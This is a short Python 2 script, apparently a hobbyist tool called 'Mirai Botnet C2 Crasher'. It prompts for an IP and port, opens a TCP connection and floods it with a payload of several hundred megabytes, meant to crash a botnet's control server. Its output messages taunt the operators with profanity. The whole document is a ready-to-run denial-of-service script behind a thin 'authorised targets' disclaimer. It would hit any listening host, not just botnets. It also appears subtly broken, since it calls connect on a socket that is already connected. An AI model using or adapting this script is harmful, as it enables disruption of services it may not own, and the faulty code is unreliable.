import socket, os, time
from os import system
'''

Mirai Botnet C2 Crasher - By Jas
Use Only On Authorised Targets.
I Was Using This On Centos 6
All Actions With This Are Your Own Resposibility
I Take 0 Responsibility

'''

def jascrasher():
	system('clear')
	c2ip = raw_input("\033[1;37;40mEnter \033[1;36;40mBotnet \033[1;37;40mIP\033[1;36;40m: ")
	c2port = input("\033[1;37;40mEnter \033[1;36;40mBotnet \033[1;37;40mPort\033[1;36;40m: ") 

	attacksock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	
	attacksock.settimeout(1)

	result = attacksock.connect_ex((c2ip,c2port))
	if result == 0:
	    connect = attacksock.connect((c2ip,c2port))
	    attacksock.send('\x00\x00'+"Jas"*99999999+'\r\n')
	    print "C2 Crashed\033[1;36;40m, \033[1;37;40mKeep Fucking These \033[1;36;40mSkids \033[1;37;40mUp"
	    time.sleep(3.0)
	else:
	    print "\033[1;37;40mPort \033[1;36;40m"+str (c2port) +" \033[1;37;40mIsnt Open On \033[1;36;40m" + c2ip + "\033[1;37;40m, Dumbass\033[1;36;40m.\033[1;37;40m"
	    time.sleep(3.0)


jascrasher()
	    